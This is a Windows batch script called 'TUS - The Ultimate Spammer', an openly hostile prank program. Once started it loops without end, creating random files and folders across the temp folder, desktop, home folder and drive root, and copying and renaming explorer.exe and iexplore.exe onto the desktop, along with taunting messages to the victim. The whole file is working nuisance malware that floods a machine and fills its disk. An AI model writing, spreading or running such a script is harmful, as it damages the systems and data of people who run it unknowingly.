@echo off
TITLE TUS - The Ultimate Spammer
color 1
echo TUS v1.3 Dev Build

echo Developed by: MohsenEMX
set reqpass=%random%-%username:~1,2%-%random%
set CurrentSessionTime=%date:~4,2%-%date:~7,2%-%date:~10,4%#%time:~0,2%-%time:~3,2%-%time:~6,2%
echo ##TUSv1 > %temp%\tus-%CurrentSessionTime%.tus
echo UserName=%UserDomain% >> %temp%\tus-%CurrentSessionTime%.tus
echo Password=%reqpass% >> %temp%\tus-%CurrentSessionTime%.tus
echo SessionData=Date: %CurrentSessionTime% >> %temp%\tus-%CurrentSessionTime%.tus
echo UserHaveOpenedProjectBefore=No >> %temp%\tus-%CurrentSessionTime%.tus
echo Password for your file is: %reqpass%
echo You will need your password later!
pause
:F1
echo What the fuck? > %tmp%\TUS-%random%-%random-%random%.%random%
echo %random%%random%-%random%-%random%-%random%-%random%-%random%-%random%-%random-%random%-%random%-%random%-%random% > %homepath%\desktop\TUS-%random%.txt
echo T U S on top!
COPY %SystemRoot%\explorer.exe %homepath%\desktop\
ren explorer.exe sucky-explorer-%random%.exe
color 2
//GOTO F2
:end
:F2
color 3
set randomxx1=%random%
set randomxx2=%random%
mkdir %homepath%\desktop\%randomxx1%
echo T U S on top! > %homedrive%\TUS-%random%-%random%-%random%.%random%
echo %random%%random%-%random%-%random%-%random%-%random%-%random%-%random%-%random%-%random%-%random%-%random%-%random% > %homepath%\desktop\%randomxx1%\TUS-%random%.txt
copy "%homedrive%\Program Files\Internet Explorer\iexplore.exe" %homepath%\desktop\%randomxx1%\
COPY %SystemRoot%\explorer.exe %homepath%\desktop\%randomxx1%\
copy "%homedrive%\Program Files\Internet Explorer\iexplore.exe" %homepath%\desktop\
ren iexplore.exe cocky-explorer-%random%.exe
echo Successfully Created %random% more random files and folders!
color 4
GOTO F3
:end
:F3
color 5
mkdir %random%
mkdir TUS-%Random%
mkdir %tmp%\%random%
mkdir %homepath%\%randomxx2%-%random%
mkdir %homedrive%\%random%
GOTO F4
:end
:F4
color 6
echo You suck! shoundn't have opened this file! > %random%.TUS-On-Top
echo MORE RANDOM FILES!
GOTO F1
:end
